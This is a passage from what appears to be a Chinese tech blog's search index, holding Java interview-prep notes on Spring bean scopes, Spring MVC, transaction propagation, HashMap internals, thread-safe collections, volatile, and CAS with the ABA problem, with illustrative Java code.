时，都将产生一个新的 Bean 实例 request 对于每次 HTTP 请求，使用 request 定义的 Bean 都将产生一个新实例，即每次 HTTP 请求将会产生不同的 Bean 实例，只有在 Web 应用中（WebApplicationContext）使用 Spring 时，该作用域才有效 session 对于每次 HTTP Session，使用 session 定义的 Bean 都将产生一个新实例，同样只有在 Web 应用中使用 Spring 时，该作用域才有效 globalsession 每个全局的 HTTP Session，使用 session 定义的 Bean 都将产生一个新实例，同样只有在 Web 应用中使用 Spring 时，该作用域才有效 其中比较常用的是 singleton 和 prototype 两种作用域。对于 singleton 作用域的 Bean，每次请求该 Bean 都将获得相同的实例，容器负责跟踪 Bean 实例的状态，负责维护 Bean 实例的生命周期；如果一个 Bean 被设置成 prototype 作用域，程序每次请求该 id 的 Bean 时，Spring 都会新建一个 Bean 实例，然后返回给程序。在这种情况下，Spring 容器仅仅使用 new 关键字创建 Bean 实例，一旦创建成功，容器不在跟踪实例，也不会维护 Bean 实例的状态。如果不指定 Bean 的作用域，Spring 默认使用 singleton 作用域。Java 在创建实例时，需要进行内存申请；销毁实例时，需要完成垃圾回收，这些工作都会导致系统开销的增加。因此，prototype 作用域下 Bean 的创建、销毁代价比较大；而 singleton 作用域的 Bean 实例一旦创建成功，可以重复使用。因此，除非必要，应尽量避免将 Bean 被设置成 prototype 作用域。 Spring MVCSpring MVC 中解决请求乱码解决 POST 请求乱码12345678910111213141516171819202122&lt;!-- 配置SpringVMC的字符编码过滤器 --&gt;&lt;filter&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;utf-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceRequestEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceResponseEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; 解决 GET 请求乱码方法一，通过 Java 代码手动指定字符编码： 1String name = new String (resuest.getParameter("name").getBytes("ISO8859-1"), utf-8); 方法二，通过配置 Tomcat 的 server.xml 配置文件指定字符编码： 1&lt;Connector connectionTimeout="20000" port="8080" protocol="HTTP/1.1" redirectPort="8443" URIEncoding="UTF-8"/&gt; Spring MVC 的工作流程Spring MVC 处理模型数据 处理模型数据的方式一：将 Controller 中方法的返回值设置为 ModelAndView 处理模型数据的方式二：将 Controller 中方法的返回值设置为 String，在方法的入参中传入 Map、Model 或者 ModelMap 上述的两种方式，最终都会被 Spring MVC 转换为一个 ModelAndView 对象 Spring MVC 工作原理图 Spring MVC 工作流程Spring MVC 各组件 DispatcherServlet：中央控制器，也称为前端控制器，它是整个请求响应的控制中心，组件的调用由它统一调度 HandlerMapping：处理器映射器，它根据用户访问的 URL 映射到对应的后端处理器 Handler。也就是说它知道处理用户请求的后端处理器，但是它并不执行后端处理器，而是将后端处理器告诉给中央处理器 HandlerAdapter：处理器适配器，它调用后端处理器中的方法，返回逻辑视图 ModelAndView 对象 ViewResolver：视图解析器，将 ModelAndView 逻辑视图解析为具体的视图（如 JSP） Handler：后端处理器，对用户具体请求进行处理，也就是 Controller 类 Spring MVC 的工作流程： 1）用户向服务端发送一次请求，这个请求会先到中央控制器 DispatcherServlet（前端控制器） 2）DispatcherServlet 接收到请求后会调用 HandlerMapping 处理器映射器。由此得知，该请求该由哪个 Controller 来处理（此时并未调用 Controller，只是得知） 3）DispatcherServlet 调用 HandlerAdapter 处理器适配器，告诉处理器适配器应该要去执行哪个 Controller 4）HandlerAdapter 处理器适配器去执行 Controller 并得到 ModelAndView （数据和视图），并层层返回给 DispatcherServlet 5）DispatcherServlet 将 ModelAndView 交给 ViewReslover 视图解析器解析，然后返回真正的视图 6）DispatcherServlet 将模型数据填充到视图中 7）DispatcherServlet 将结果响应给用户 Spring 数据库事务Spring 的七种事务传播行为当事务方法被另一个事务方法调用时，必须指定事务应该如何传播。例如：方法可能在现有的事务中运行，也可能开启一个新的事务，并在自己的事务中运行。Spring 定义了七种事务传播行为，默认的事务传播行为是 PROPAGATION_REQUIRED。 传播行为 说明 PROPAGATION_REQUIRED 如果存在一个事务，则支持当前事务；如果没有事务则开启 PROPAGATION_SUPPORTS 如果存在一个事务，支持当前事务；如果没有事务，则非事务的执行 PROPAGATION_MANDATORY 如果已经存在一个事务，支持当前事务；如果没有一个活动的事务，则抛出异常 PROPAGATION_REQUIRES_NEW 总是开启一个新的事务；如果一个事务已经存在，则将这个存在的事务挂起 PROPAGATION_NOT_SUPPORTED 总是非事务地执行，并挂起任何存在的事务 PROPAGATION_NEVER 总是非事务地执行，如果存在一个活动事务，则抛出异常 PROPAGATION_NESTED 如果有一个活动的事务存在，则运行在一个嵌套的事务中；如果没有活动事务，则按 PROPAGATION_REQUIRED 执行 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"Java 集合类面试题之一",url:"/posts/cc846db2.html",text:'集合类基础常见的集合类有哪些Map 接口和 Collection 接口是所有集合框架的父接口，其中 Collection 接口的子接口包括 Set 接口和 List 接口： Set 接口的实现类主要有：HashSet、TreeSet、LinkedHashSet 等 List 接口的实现类主要有：ArrayList、LinkedList、Stack、Vector 等 Map 接口的实现类主要有：HashMap、TreeMap、HashTable、ConcurrentHashMap 以及 Properties 等 HashMap 与 HashTable 的区别 HashMap 允许 K/V 都为 Null，Hashtable 规定 K/V 都不允许为 Null HashMap 继承自 AbstractMap 类，而 HashTable 继承自 Dictionary 类 HashMap 没有考虑同步，是线程不安全的；Hashtable 使用了 synchronized 关键字，是线程安全的 集合类源码分析HashMap 的 Put 方法的具体流程 ★展开源代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061final V putVal(int hash, K key, V value, boolean onlyIfAbsent, boolean evict) { HashMap.Node&lt;K, V&gt;[] tab; HashMap.Node&lt;K, V&gt; p; int n, i; // 1.如果table为空或者长度为0，即没有元素，那么使用resize()方法扩容 if ((tab = table) == null || (n = tab.length) == 0) n = (tab = resize()).length; // 2.计算插入存储的数组索引i，此处计算方法同 1.7 中的indexFor()方法 // 如果数组为空，即不存在Hash冲突，则直接插入数组 if ((p = tab[i = (n - 1) &amp; hash]) == null) tab[i] = newNode(hash, key, value, null); // 3.插入时，如果发生Hash冲突，则依次往下判断 else { HashMap.Node&lt;K, V&gt; e; K k; // a.判断table[i]的元素的key是否与需要插入的key一样，若相同则直接用新的value覆盖掉旧的value // 判断原则equals() - 所以需要当key的对象重写该方法 if (p.hash == hash &amp;&amp; ((k = p.key) == key || (key != null &amp;&amp; key.equals(k)))) e = p; // b.继续判断：需要插入的数据结构是红黑树还是链表 // 如果是红黑树，则直接在树中插入 or 更新键值对 else if (p instanceof HashMap.TreeNode) e = ((HashMap.TreeNode&lt;K, V&gt;) p).putTreeVal(this, tab, hash, key, value); // 如果是链表，则在链表中插入 or 更新键值对 else { // i .遍历table[i]，判断key是否已存在：采用equals对比当前遍历结点的key与需要插入数据的key // 如果存在相同的，则直接覆盖 // ii.遍历完毕后任务发现上述情况，则直接在链表尾部插入数据 // 插入完成后判断链表长度是否 &gt; 8：若是，则把链表转换成红黑树 for (int binCount = 0; ; ++binCount) { if ((e = p.next) == null) { p.next = newNode(hash, key, value, null); if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st treeifyBin(tab, hash); break; } if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) break; p = e; } } // 对于i 情况的后续操作：发现key已存在，直接用新value覆盖旧value&amp;返回旧value if (e != null) { // existing mapping for key V oldValue = e.value; if (!onlyIfAbsent || oldValue == null) e.value = value; afterNodeAccess(e); return oldValue; } } ++modCount; // 插入成功后，判断实际存在的键值对数量size &gt; 最大容量 // 如果大于则进行扩容 if (++size &gt; threshold) resize(); // 插入成功时会调用的方法（默认实现为空） afterNodeInsertion(evict); return null;} HashMap 的扩容操作如何实现的 ★展开源代码★ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283/** * 该方法有两种使用情况：1.初始化哈希表；2.当前数组容量过小，需要扩容 */final Node&lt;K, V&gt;[] resize() { Node&lt;K, V&gt;[] oldTab = table;// 扩容前的数组（当前数组） int oldCap = (oldTab == null) ? 0 : oldTab.length;// 扩容前的数组容量（数组长度） int oldThr = threshold;// 扩容前数组的阈值 int newCap, newThr = 0; if (oldCap &gt; 0) { // 针对情况2：若扩容前的数组容量超过最大值，则不再扩容 if (oldCap &gt;= MAXIMUM_CAPACITY) { threshold = Integer.MAX_VALUE; return oldTab; } // 针对情况2：若没有超过最大值，就扩容为原来的2倍（左移1位） else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp; oldCap &gt;= DEFAULT_INITIAL_CAPACITY) newThr = oldThr &lt;&lt; 1; // double threshold } // 针对情况1：初始化哈希表（采用指定或者使用默认值的方式） else if (oldThr &gt; 0) // initial capacity was placed in threshold newCap = oldThr; else { // zero initial threshold signifies using defaults newCap = DEFAULT_INITIAL_CAPACITY; newThr = (int) (DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY); } // 计算新的resize上限 if (newThr == 0) { float ft = (float) newCap * loadFactor; newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float) MAXIMUM_CAPACITY ? (int) ft : Integer.MAX_VALUE); } threshold = newThr; @SuppressWarnings({"rawtypes", "unchecked"}) Node&lt;K, V&gt;[] newTab = (Node&lt;K, V&gt;[]) new Node[newCap]; table = newTab; if (oldTab != null) { // 把每一个bucket都移动到新的bucket中去 for (int j = 0; j &lt; oldCap; ++j) { Node&lt;K, V&gt; e; if ((e = oldTab[j]) != null) { oldTab[j] = null; if (e.next == null) newTab[e.hash &amp; (newCap - 1)] = e; else if (e instanceof TreeNode) ((TreeNode&lt;K, V&gt;) e).split(this, newTab, j, oldCap); else { // preserve order Node&lt;K, V&gt; loHead = null, loTail = null; Node&lt;K, V&gt; hiHead = null, hiTail = null; Node&lt;K, V&gt; next; do { next = e.next; if ((e.hash &amp; oldCap) == 0) { if (loTail == null) loHead = e; else loTail.next = e; loTail = e; } else { if (hiTail == null) hiHead = e; else hiTail.next = e; hiTail = e; } } while ((e = next) != null); if (loTail != null) { loTail.next = null; newTab[j] = loHead; } if (hiTail != null) { hiTail.next = null; newTab[j + oldCap] = hiHead; } } } } } return newTab;} 集合类的线程安全性集合类的非线程安全问题问题：普通的集合类是非线程安全的，请编写一个线程不安全的使用案例并给出解决方案 ★展开案例代码★ 12345678910111213public class ArrayListUnSafe { public static void main(String[] args) { List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (int i = 0; i &lt; 10; i++) { new Thread(() -&gt; { list.add(UUID.randomUUID().toString().substring(0, 8)); System.out.println(list); }).start(); } }} 1运行结果可能会抛出 java.util.ConcurrentModificationException 异常 回答： 第一方法：使用 Vector 替代 ArrayList，即 List&lt;String&gt; list = new Vector&lt;&gt;(); 第二种方法：使用 Collectons 类，即 List&lt;String&gt; list = Collections.synchronizedList(new ArrayList()); 第三种方法：使用 CopyOnWriteArrayList 类，即 List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); 集合类的写时复制（CopyOnWrite）写时复制（CopyOnWrite）介绍CopyOnWrite 容器即写时复制的容器。往一个容器添加元素的时候，不直接往当前容器的 Object[] 添加，而是先将当前 Object[] 进行 Copy，复制出一个新的容器 Object[] newElements，然后新的容器 Object[] newElements 里添加元素，添加完元素之后，再将原容器的引用指向新的容器（setArray（newElements））。这样做的好处是可以对 CopyOnWrite 容器进行并发的读，而不需要加锁，因为当前容器不会添加任何元素。所以 CopyOnWrite 容器也是一种读写分离的思想，读和写的是不同的容器。JDK 8 的 CopyOnWriteArrayList 的源码如下： 写时复制（CopyOnWrite）优缺点应用场景：应用于读多写少的并发场景使用注意：为了减少扩容开销，尽量使用批量添加（减少复制次数）缺点：存在内存占用问题、数据一致性问题（CopyOnWrite 机制只能保证最终的数据一致，不能保证实时数据的强一致性，因此如果希望写入的数据能马上能读到，此时就不应该使用 CopyOnWrite） 线程安全的集合类总结 CopyOnWriteArrayList：CopyOnWriteArrayList 中的 add、set、remove 等方法，都是用了 ReentrantLock 的 lock() 来加锁，unlock() 来解锁。当增加元素时使用 Array.copyOf() 来拷贝副本，在副本上增加元素，然后改变原引用指向副本，读操作不加锁，适合读操作远远多于写操作的应用。 CopyOnWriteArraySet：CopyOnWriteArraySet 是在 CopyOnWriteArrayList 的基础上使用了 Java 的装饰模式，底层还是使用 CopyOnWriteArrayList 来实现。List 和 Set 的区别同样适用于 CopyOnWriteArrayList 和 CopyOnWriteArraySet。 ConcurrentHashMap：ConcurrentHashMap 是 HashMap 的线程安全版（但此类不允许 Null 做键或者值），同 HashTable 相比，ConcurrentHashMap 不仅保证了访问的线程安全性，而且在效率上与 HashTable 相比有较大的提高。ConcurrentHashMap 允许多个修改操作并发进行，底层使用了锁分离的技术，即代码块锁，而不是方法锁。其中使用了多个锁来控制对 HashTable 的不同部分进行的修改。ConcurrentHashMap 内部使用段（Segment）来表示不同的部分，每个段其实就是一个小的 HashTable，它们有自己的锁（使用 ReentrantLock 来实现）。只要多个修改发生在不同的段上，它们就可以并发进行。 总结： HashMap 是非线程安全的，HashTable 是线程安全的 LinkedList、ArrayList、HashSet 是非线程安全的，Vector 是线程安全的 ConcurrentHashMap、CopyOnWriteArrayList、CopyOnWriteArraySet 是线程安全的，这几个都是 java.util.concurrent 包提供的并发线程安全的集合类 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"企业面试"},{title:"Java 多线程面试题之一",url:"/posts/1f270e10.html",text:'谈谈对 Volatile 的理解Volatile 的特性Volatile 是 Java 虚拟机提供的轻量级的同步机制，具有以下三大特性： 保证可见性 不保证原子性 禁止指令重排 Java 内存模型JMM（Java 内存模型，简称 JMM）本身是一种抽象的概念并不真实存在，它描述的是一组规则或规范，通过这组规范定义了程序中各个变量（包括实例字段、静态字段和构成数组对象的元素）的访问方式，即屏蔽掉 Java 程序在各种不同的硬件和操作系统对内存的访问的差异，这样就可以实现 Java 程序在各种不同的平台上都能达到内存访问的一致性。 JMM 关于同步的规定如下： 1）线程解锁前，必须把共享变量的值刷新回主内存 2）线程加锁前，必须读取主内存的最新值到自己的工作内存 3）加锁解锁是同一把锁 由于 JVM 运行程序的实体是线程，而每个线程创建时 JVM 都会为其创建一个工作内存（有些地方称为栈空间），工作内存是每个线程的私有数据区域，而在 Java 内存模型中规定所有变量都存储到主内存，主内存是共享内存区域，所有线程都可以访问，但线程对变量的操作（读取、复制等）必须在工作内存中进行。首先要将变量从主内存拷贝到自己的工作内存空间，然后对变量进行操作，操作完成后再将变量写回主内存，不能直接操作主内存中的变量，各个线程中的工作内存中存储着主内存中的变量副本拷贝，因此不同的线程间无法访问对方的工作内存，线程间的通信（传值）必须通过主内存来完成，其简要访问过程如下图： Java 内存模型的特性Java 内存模型围绕着并发过程中如何处理原子性、可见性和有序性这三个特征来设计的。 原子性（Atomicity）： 由 Java 内存模型来直接保证原子性的变量操作包括 read、load、use、assign、store、write 这六种操作，虽然存在 long 和 double 的特例，但基本可以忽略不计，目前虚拟机基本都对其实现了原子性。如果需要更大范围的控制，lock 和 unlock 也可以满足需求。lock 和 unlock 虽然没有被虚拟机直接提供给用户使用，但是提供了字节码层次的指令 monitorenter 和 monitorexit 对应这两个操作，对应到 Java 代码就是 synchronized 关键字，因此在 synchronized 块之间的代码都具有原子性。 可见性（Visibility）： 可见性是指一个线程修改了一个变量的值后，其他线程立即可以感知到这个值的修改。正如前面所说，volatile 类型的变量在修改后会立即同步给主内存，在使用的时候会从主内存重新读取，是依赖主内存为中介来保证多线程下变量对其他线程的可见性的。除了 volatile 之外，synchronized 和 final 也可以实现可见性。synchronized 关键字是通过 unlock 之前必须把变量同步回主内存来实现的，final 则是在初始化后就不会更改，所以只要在初始化过程中没有把 this 指针传递出去也能保证对其他线程的可见性。 有序性： 有序性从不同的角度来看是不同的。单纯单线程来看都是有序的，但到了多线程就会跟我们预想的不一样。可以这么说：如果在本线程内部观察，所有操作都是有序的；如果在一个线程中观察另一个线程，所有的操作都是无序的。前半句说的就是线程内表现为串行的语义，后半句指的是指令重排现象和主内存与工作内存之间同步存在延迟的现象。保证有序性的关键字有 volatile 和 synchronized，其中 volatile 禁止了指令重排序，而 synchronized 则由一个变量在同一时刻只能被一个线程对其进行 lock 操作来保证。 总结：synchronized 对三种特性都有支持，虽然简单，但是如果无控制地滥用对性能就会产生较大影响。 Java 内存模型的可见性问题各个线程对主内存中共享变量的操作，其本质都是各个线程各自拷贝共享变量到自己的工作内存中进行操作后再写回主内存中的。这就可能存在一个线程 A 修改了共享变量 X 的值但还未写回主内存时，另一个线程 B 又对主内存中同一个共享变量 X 进行操作，但此时 A 线程工作内存中的共享变量 X 对线程 B 来说并不是可见的，这种工作内存与主内存同步存在延迟现象就会造成可见性问题。此时可以使用 synchronized 或 volatile 关键字解决该问题，两者都可以使一个线程修改后的变量立即对其他线程可见。 Volatile 的验证代码Volatile 保证可见性的验证代码 ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 1 验证volatile的可见性 * 1.1 加入int number=0，number变量之前没有添加volatile关键字修饰，没有可见性 * 1.2 添加了volatile关键字，可以解决可见性问题 */ public class VolatileDemo { public static void main(String[] args) { MyData data = new MyData(); new Thread(() - &gt; { System.out.println(Thread.currentThread().getName() + " thread come in"); try { TimeUnit.SECONDS.sleep(3); } catch(InterruptedException e) { e.printStackTrace(); } data.setNumber(); System.out.println(Thread.currentThread().getName() + " thread set number is " + data.number); }, "AAA").start(); while(data.number == 0) { // main线程一直在这里循环等待，直到number的值不再等于零 } System.out.println(Thread.currentThread().getName() + " thread is over, the number is " + data.number); } } class MyData { // int number = 0; // volatile可以保证可见性，即可以及时通知其他线程，主内存中的变量值已经被修改 volatile int number = 0; public void setNumber() { this.number = 60; } } 123AAA thread come inAAA thread set number is 60main thread is over, the number is 60 Volatile 不保证原子性的验证代码Volatile 不保证原子性，这里的原子性是指不可分割，完整性，即某个线程正在做某个具体业务时，中间不可以被加塞或者被分割；需要整体完整，要么同时成功，要么同时失败。基于 Volatile 变量的运算在并发下不是线程安全的。Volatile 的规则保证了 read、load、use 的顺序和连续性，同理 assign、store、write 也是顺序和连续的。也就是这几个动作是原子性的，但是对变量的修改，或者对变量的运算，却不能保证是原子性的。如果对变量的修改是分为多个步骤的，那么多个线程同时从主内存拿到的值是最新的，但是经过多步运算后回写到主内存的值是有可能存在覆盖情况发生的。 ★展开代码★ 1234567891011121314151617181920212223242526272829303132333435363738/** * 1. 验证volatile不保证原子性 */ public class VolatileDemo2 { public static void main(String[] args) { MyData2 data = new MyData2(); for(int i = 0; i &lt; 20; i++) { new Thread(() - &gt; { for(int j = 0; j &lt; 1000; j++) { data.add(); } }).start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println("the number is " + data.number); } } class MyData2 { volatile int number = 0; public void add() { this.number++; } } 1the number is 15386 上述代码就是对 volatile 类型的变量启动了 20 个线程，每个线程对变量执行 1000 次加 1 操作，如果 volatile 变量并发操作没有问题的话，那么结果应该是输出 20000，但是运行结果每次大概率都是小于 20000，这就是因为 number++ 操作不是原子性的（图解），是分多个步骤完成的。假设两个线程 a、b 同时取到了主内存的值是 0，这是没有问题的，在进行 ++ 操作的时候假设线程 a 执行到一半，线程 b 执行完了，这时线程 b 立即同步给了主内存，主内存的值为 1，而线程 a 此时也执行完了，同步给了主内存，此时的值仍然是 1，线程 b 的结果被覆盖掉了。 解决 Volatile 不保证原子性的问题由于 Volatile 不保证原子性，导致基于 Volatile 变量的运算在并发下不是线程安全的，此时可以使用 AtomicInteger 这样的原子包装类来解决。 ★展开代码★ 123456789101112131415161718192021222324252627282930313233343536373839/** * 1. 使用AtomicInteger解决Volatile不保证原子性的问题 */ public class VolatileDemo3 { public static void main(String[] args) { MyData3 data = new MyData3(); for(int i = 0; i &lt; 20; i++) { new Thread(() - &gt; { for(int j = 0; j &lt; 1000; j++) { data.add(); } }).start(); } while(Thread.activeCount() &gt; 1) { Thread.yield(); } System.out.println("the number is " + data.number.get()); } } class MyData3 { // AtomicInteger类里的变量包含了volatile关键字 AtomicInteger number = new AtomicInteger(); public void add() { this.number.getAndIncrement(); } } 单例模式中 Volatile 的使用分析 ★展开代码★ 1234567891011121314151617181920212223242526272829303132333435363738394041/** * 单例模式 * 1) DCL（双端检锁）机制不一定是线程安全的，原因是有指令重排序的存在 * 2) 原因在多线程环境下，某一个线程执行到第一个检测，读取到的instance不为null时，instance的引用对象可能没有完成初始化 * 3) 指令重排只会保证串行语义的执行一致性（单线程），但并不会关心多线程间的语义一致性。所以当一条线程访问instance不为null时，由于instance实例未必已初始化完成，也就造成了线程安全问题 */public class VolatileDemo4{ private static VolatileDemo4 demo; private VolatileDemo4() { System.out.println("inited ..."); } public static VolatileDemo4 getInstance() { if(demo == null) { synchronized(VolatileDemo4.class) { if(demo == null) { demo = new VolatileDemo4(); } } } return demo; } public static void main(String[] args) { for(int i = 0; i &lt; 10; i++) { new Thread(() - &gt; { VolatileDemo4.getInstance(); }).start(); } }} 其中代码 demo = new VolatileDemo4(); 可以分为以下三步完成（伪代码）： 123memory = allocate(); //1.分配对象内存空间init(memory); //2.初始化对象instance = memory; //3.设置 instance 指向刚分配的内存地址，此时 instance != null 步骤二和步骤三不存在数据依赖关系，而且无论重排前还是重排后程序的执行结果在单线程中并没有改变，因此这种重排优化是允许的。指令重排后的伪代码如下： 123memory = allocate(); //1.分配对象内存空间instance = memory; //3.设置 instance 指向刚分配的内存地址，此时 instance != null，但是对象还没有完成初始化init(memory); //2.初始化对象 指令重排只会保证串行语义的执行一致性（单线程），但并不会关心多线程间的语义一致性。所以当一个线程访问 instance 不为 null 时，由于 instance 实例未必已初始化完成，也就造成了线程安全问题。为了保证线程安全，可以加入 volatile 关键字来禁止指令重排，完整的示例代码如下： ★展开代码★ 123456789101112131415161718192021222324252627282930313233343536373839/*** 单例模式中使用Volatile* 1) DCL（双端检锁）机制不一定是线程安全的，原因是有指令重排序的存在，加入volatile可以禁止指令重排 */public class VolatileDemo4{ private static volatile VolatileDemo4 demo; private VolatileDemo4() { System.out.println("inited ..."); } public static VolatileDemo4 getInstance() { if(demo == null) { synchronized(VolatileDemo4.class) { if(demo == null) { demo = new VolatileDemo4(); } } } return demo; } public static void main(String[] args) { for(int i = 0; i &lt; 10; i++) { new Thread(() - &gt; { VolatileDemo4.getInstance(); }).start(); } }} CAS面试内容一般由浅入深，涉及的内容为： 原子类 –&gt; CAS –&gt; UnSafe –&gt; CAS 底层思想 –&gt; ABA 问题 –&gt; 原子更新引用 –&gt; 如何解决 ABA 问题 CAS 是什么CAS（Conmpare And Swap，比较和交换）是一条 CPU 并发原语。它的功能是判断内存某个位置的值是否为预期值，如果是则更改为新的值，否则继续比较到两者相同为止，这个过程是原子的。CAS 并发原语体现在 Java 语言中就是 sun.misc.Unsafe 类中的各个方法。调用 UnSafe 类中的 CAS 方法，JVM 会帮我们实现 CAS 汇编指令。这是一种完全依赖于硬件的功能，通过它可以实现原子操作。由于 CAS 是一种系统原语，原语属于操作系统用语范畴，是由若干指令组成的，用于完成某个功能的一个过程，并且原语的执行必须是连续的，在执行过程中不允许被中断；也就是说 CAS 是一条 CPU 的原子指令，不会造成所谓的数据不一致性问题。java.util.concurrent 包中借助 CAS 实现了区别于 synchronouse 同步锁的一种乐观锁。 CAS 底层原理谈谈对 Unsafe 的理解 Unsafe 是 CAS 的核心实现类，由于 Java 方法无法直接访问底层系统，需要通过本地（native）方法来访问，Unsafe 相当于一个后门，基于该类可以直接操作特定内存的数据。Unsafe 类存在于 sun.misc 包中，其内部方法操作可以像 C/C++ 的指针一样直接操作内存，即 Java 中 CAS 操作的执行依赖于 Unsafe 类的方法。特别注意：在 JDK 8 中，Unsafe 类中的大多数方法都是 native 修饰的，也就是说 Unsafe 类中的方法都直接调用操作系统底层资源来执行相应任务。在 AtomicInteger 的源码里（如下第一张图），变量 valueOffset 表示该变量在内存中的偏移地址，因为 Unsafe 就是根据内存偏移地址获取数据的。变量 value 用 volatile 修饰，保证了多线程之间的内存可见性。 AtomicInteger 类的源码 AtomicInteger 类与 Unsafe 类的源码调用分析 假设线程 A 和线程 B 两个线程同时执行 getAndAddInt() 方法（分别在不同的 CPU 上）: 1）AtomicInteger 里面的 value 原始值为 3，即主内存中 AtomicInteger 的 value 为 3，根据 JMM 模型，线程 A 和线程 B 各自拷贝一份值为 3 的 value 的副本到各自的工作内存中 2）线程 A 通过 getIntVolatile(var1,var2) 拿到 value 值为 3，这时候线程 A 突然被挂起 3）线程 B 也通过 getIntVolatile(var1,var2) 拿到 value 值为 3，此时刚好线程 B 没有被挂起，并执行 compareAndSwapInt() 方法比较主内存中的值也是 3，成功修改主内存中的值为 4，线程 B 至此完成任务操作 4）这时候线程 A 恢复，执行 compareAndSwapInt() 方法比较，发现自己手里的数值和主内存中的数字 4 不一致，说明该值已经被其他线程抢先一步修改了，那 A 线程修改失败，只能重新操作一遍 5）线程 A 重新获取 value 的值，因为变量 value 是 volatile 修饰，所以其他线程对它的修改，线程 A 总是能够感知到，线程 A 继续执行 compareAndSwapInt() 方法进行比较和交换，直到成功为止 值得一提的是，UnSafe 类中的 compareAndSwapInt() 是一个本地方法，该方法的具体实现位于 unsafe.cpp 中。 CAS 的缺点 循环时间长开销大：如果 CAS 失败，会一直继续尝试；如果 CAS 长时间一直不成功，可能会给 CPU 带来很大的开销 只能保证一个共享变量的原子操作：对于多个共享变量操作时，循环 CAS 就无法保证操作的原子性了，此时可以使用锁来保证原子性 引出了 ABA 问题 CAS 的 ABA 问题在原子类（如 AtomicInteger）中 CAS 会导致 “ABA 问题”，这是因为 CAS 算法实现的一个重要前提是需要取出内存中某时刻的数据并在当下时刻比较并替换，那么在这个时间差里数据可能会发生变化。比如一个线程 One 从内存位置 V 中取出 A，这个时候另一个线程 Two 也从内存中取出 A，并且线程 Two 进行了一些操作将内存位置 V 中的值改为 B，然后线程 Two 又将内存位置 V 的数据改为 A，这时候线程 One 进行 CAS 操作会发现内存中仍然是 A，然后线程 One 就认为操作成功了。尽管线程 One 的 CAS 操作成功，但是不代表这个过程就是没问题的，这里有点狸猫换太子的意思。 原子更新引用原子引用JDK 提供了 AtomicInteger、AtomicBoolean、AtomicLong 等原子类，但如果需要对自定义的类（如 User 类）进行原子包装，那么则需要使用原子引用类 AtomicReference 来实现，示例代码如下： ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 原子引用类 AtomicReference 的使用 */public class AtomicReferenceDemo { public static void main(String[] args) { User user1 = new User(20, "Jim"); User user2 = new User(24, "Tom"); AtomicReference&lt;User&gt; atomicReference = new AtomicReference&lt;User&gt;(); atomicReference.set(user1); boolean result = atomicReference.compareAndSet(user1, user2); System.out.println(result + " " + atomicReference.get()); boolean result2 = atomicReference.compareAndSet(user1, user2); System.out.println(result2 + " " + atomicReference.get()); }}class User { private int age; private String name; public int getAge() { return age; } public void setAge(int age) { this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public User(int age, String name) { this.age = age; this.name = name; } @Override public String toString() { return "User [age=" + age + ", name=" + name + "]"; }} 12true User [age=24, name=Tom]false User [age=24, name=Tom] 版本号原子引用普通原子类（AtomicInteger）或者原子引用类（AtomicReference）会产生 ABA 问题，示例代码如下： ★展开代码★ 123456789101112131415161718192021222324252627/** * 会产生 ABA 问题的代码 */public class ABADemo { public static AtomicReference&lt;Integer&gt; atomicReference = new AtomicReference&lt;Integer&gt;(100); public static void main(String[] args) { new Thread(() -&gt; { atomicReference.compareAndSet(100, 101); atomicReference.compareAndSet(101, 100); }, "t1").start(); new Thread(() -&gt; { try { // 暂定两秒t2线程，保证上面的t1线程完成了一次ABA操作 TimeUnit.SECONDS.sleep(2); } catch (InterruptedException e) { e.printStackTrace(); } boolean result = atomicReference.compareAndSet(100, 102); System.out.println(result + " " + atomicReference.get()); }, "t2").start(); }} 1true 102 使用 AtomicStampedReference 版本号原子引用类解决 ABA 问题，示例代码如下： ★展开代码★ 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * 使用 AtomicStampedReference 版本号原子引用类解决 ABA 问题 